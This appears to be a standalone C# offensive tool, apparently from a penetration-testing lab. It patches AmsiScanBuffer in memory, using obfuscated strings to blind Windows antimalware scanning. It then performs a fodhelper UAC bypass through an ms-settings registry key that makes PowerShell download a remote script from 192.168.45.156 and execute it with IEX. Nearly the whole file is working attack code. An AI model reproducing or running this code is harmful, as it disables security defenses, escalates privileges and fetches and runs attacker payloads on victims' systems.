using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Amsi
{
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
    static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

    public static void patch()
    {
        IntPtr TargetDLL = LoadLibrary("a" + "m" + "s" + "i" + ".dll");
        if (TargetDLL == IntPtr.Zero)
        {
            Console.WriteLine("ERROR: Could not retrieve pointer!");
            return;
        }

        IntPtr BufrPtr = GetProcAddress(TargetDLL, "Ams" + "iSc" + "anBu" + "ffer");
        if (BufrPtr == IntPtr.Zero)
        {
            Console.WriteLine("ERROR: Could not retrieve function pointer!");
            return;
        }

        Console.WriteLine("Addr: " + BufrPtr.ToString());

        UIntPtr dwSize = (UIntPtr)3;
        uint Zero = 0;

        if (!VirtualProtect(BufrPtr, dwSize, 0x40, out Zero))
        {
            Console.WriteLine("ERROR: Could not modify memory permissions!");
            return;
        }
        Console.WriteLine("Success: We modified memory permissions!");

        byte[] p = new byte[12] { 0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3 };

        IntPtr unmanagedPointer = Marshal.AllocHGlobal(12);

        Marshal.Copy(p, 0, unmanagedPointer, 12);

        MoveMemory(BufrPtr, unmanagedPointer, 12);

        if (!VirtualProtect(BufrPtr, dwSize, 0x20, out Zero))
        {
            Console.WriteLine("ERROR: Could not modify memory permissions!");
            return;
        }
        Console.WriteLine("Success, function patched! :)");

        string rP = @"Software\Classes\ms-settings\shell\open\command";
        using (RegistryKey k = Registry.CurrentUser.CreateSubKey(rP, true))
        {
            k.SetValue("", "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.45.156:8000/run2.txt') | IEX", RegistryValueKind.String);
            k.SetValue("DelegateExecute", "", RegistryValueKind.String);
        }

        Process.Start("C:\\Windows\\System32\\fodhelper.exe");

        return;
    }
}
